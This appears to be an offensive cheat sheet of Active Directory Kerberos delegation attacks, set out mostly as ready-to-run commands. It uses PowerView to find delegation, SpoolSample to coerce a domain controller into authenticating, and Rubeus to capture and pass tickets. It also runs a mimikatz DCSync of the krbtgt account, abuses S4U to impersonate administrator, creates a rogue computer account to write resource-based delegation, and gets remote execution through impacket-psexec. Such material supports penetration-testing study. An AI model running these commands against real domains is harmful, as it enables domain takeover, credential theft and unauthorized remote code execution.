# Delegation Attacks

### Find unconstrained delegation

Machines that store user TGTs — Compromise = capture tickets

```bash
# BloodHound: "Find Computers with Unconstrained Delegation"
# PowerView:
Get-DomainComputer -Unconstrained | Select-Object dnshostname
```

---

### Exploit unconstrained delegation

Coerce DC to authenticate, capture TGT, use it

```bash
# 1. Monitor for TGTs:
.\Rubeus.exe monitor /interval:5

# 2. Coerce DC:
.\SpoolSample.exe $DC_IP $COMPROMISED_HOST

# 3. Use captured ticket:
.\Rubeus.exe ptt /ticket:<base64_ticket>
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

---

### Find constrained delegation

Services allowed to delegate to specific SPNs

```bash
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
```

---

### Exploit constrained delegation

S4U2Self + S4U2Proxy — Request ticket as any user

```bash
# Rubeus:
.\Rubeus.exe s4u /user:svc_sql /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# Impacket:
impacket-getST -spn cifs/target.domain.local -impersonate administrator domain.local/svc_sql:'Password1'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass target.domain.local
```

---

### Resource-Based Constrained Delegation (RBCD)

If you can write msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
# 1. Create computer account:
impacket-addcomputer -computer-name FAKE01 -computer-pass 'Password1' domain.local/user:'password'

# 2. Set RBCD:
impacket-rbcd -delegate-to TARGET$ -delegate-from FAKE01$ -action write domain.local/user:'password'

# 3. Get ticket:
impacket-getST -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01$:'Password1'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass target.domain.local
```

---
